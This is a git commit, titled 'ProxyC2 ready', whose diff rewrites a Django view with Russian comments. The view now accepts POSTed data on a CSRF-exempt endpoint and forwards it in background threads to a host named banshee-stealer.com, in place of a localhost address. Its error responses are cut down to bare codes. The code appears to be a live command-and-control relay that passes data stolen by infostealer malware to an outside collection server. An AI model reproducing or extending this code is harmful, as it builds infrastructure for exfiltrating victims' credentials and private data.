f2dd912204f3aba5b1b47cbc932dee2823cb44c3
root <root@BUILDER.aeza.network>
2024-08-09 04:08:50 +0300

    ProxyC2 ready

--- proxyProject/app/views.py
+++ proxyProject/app/views.py
@@ -1,34 +1,38 @@
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 import json
-import multiprocessing
+from concurrent.futures import ThreadPoolExecutor
 import requests
 
+# Создание пула потоков, который будет использоваться для отправки данных
+executor = ThreadPoolExecutor(max_workers=5)
 
 @csrf_exempt
 def send(request):
     if request.method == 'POST':
         try:
+            # Получаем и декодируем данные из запроса
             data = json.loads(request.body)
             encoded_data = data.get('data', '')
-            create_new_process(encoded_data)
-            return JsonResponse({'success': 'cool'}, status=200)
+            # Запускаем отправку данных в отдельном потоке
+            create_new_thread(encoded_data)
+            return JsonResponse({'success': '1'}, status=200)
         except json.JSONDecodeError:
-            return JsonResponse({'error': 'Invalid JSON'}, status=400)
+            return JsonResponse({'error': '2'}, status=400)
     else:
-        return JsonResponse({'error': 'Invalid request method'}, status=400)
+        return JsonResponse({'error': '3'}, status=400)
 
-
-def create_new_process(data):
-    process = multiprocessing.Process(target=send_data, args=(data, ))
-    process.start()
-    process.join()
-
+def create_new_thread(data):
+    # Отправка задачи на выполнение в пул потоков
+    executor.submit(send_data, data)
 
 def send_data(data):
     try:
-        url = "http://127.0.0.1:8000/api/data/"
-        response = requests.post(url, json=data)
+        url = "http://banshee-stealer.com/api/data/"
+        # Отправка данных в виде POST-запроса
+        response = requests.post(url, json={"data": data})
+        # Логируем ответ от сервера
         print(response.json())
     except Exception as ex:
-        print(ex)
+        # Логируем исключение в случае ошибки
+        print(f"Exception occurred: {ex}")
